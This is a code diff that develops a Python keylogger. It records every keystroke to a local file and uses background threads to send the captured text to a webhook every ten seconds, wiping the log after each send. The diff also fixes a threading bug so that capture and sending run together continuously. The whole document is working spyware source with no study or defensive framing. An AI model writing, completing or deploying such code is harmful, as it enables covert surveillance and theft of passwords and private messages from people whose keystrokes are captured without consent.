@@ -4,12 +4,9 @@ import threading
 #import requests
 #import json
 import time
-
-
+#----------------------------------------------------------------------
 #multithreading
-
 #rdm_sec = [500,600,700,800,900]
-
 # This function runs every time a key is pressed
 def on_press(key):
     try:
@@ -26,61 +23,68 @@ def on_press(key):
         file.write(log)
 
 
-
-
-
+#----------------------------------------------------------------------
 
 def llistener():
+
     # Start the key listener
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-
-
-
-
-
+#----------------------------------------------------------------------
 #send content of file function
 
-hook = Webhook ("")
+hook = Webhook ("web hook here")
 
 def send():
-    with open("keylog.txt", "r") as file:
-        content = file.read()
-    if not content.strip():
-        return
-    # data = "hello world test!"
-    hook.send(content)
-    with open("keylog.txt", "r+") as con:
-        con.seek(0)
-        con.truncate()
-
-    time.sleep(300)
+    while True:
+        print("send loop")
 
 
+        with open("keylog.txt", "r") as file:
+            content = file.read()
+        if not content.strip():
+            print("go back")
+            continue
+        # data = "hello world test!"
+        hook.send(content)
+        print("sent")
+        with open("keylog.txt", "r+") as con:
+            print("erased")
+            con.seek(0)
+            con.truncate()
+        time.sleep(10)
 
 
+#    time.sleep(300)
+
+#----------------------------------------------------------------------
 
 
-
-
-
-
-
-
-
-thread1 = threading.Thread(target=llistener())
+thread1 = threading.Thread(target=llistener, daemon=True)
+thread2 = threading.Thread(target=send, daemon=True)
+    # Start the threads
 thread1.start()
-thread2 = threading.Thread(target=send)
 thread2.start()
-# Start the threads
-#wait for both threads to finish
-thread1.join()
-thread2.join()
+    # wait for both threads to finish
+#    thread1.join()
+#    thread2.join()
+
+while True:
+     pass
+
+#start_time = time.time()
 
 #while True:
-#    send()
-#    time.sleep(100)
+
+
+#    llistener()
+
+
+#    if time.time() - start_time >= 100:
+#        send()
+#        start_time = time.time()
+
 
 
 
@@ -110,6 +114,11 @@ thread2.join()
 #while True:
 #    send_file()
 #    time.sleep(100)  # 300 sec. 5 minutes
+
+
+
+
+
 
 
 
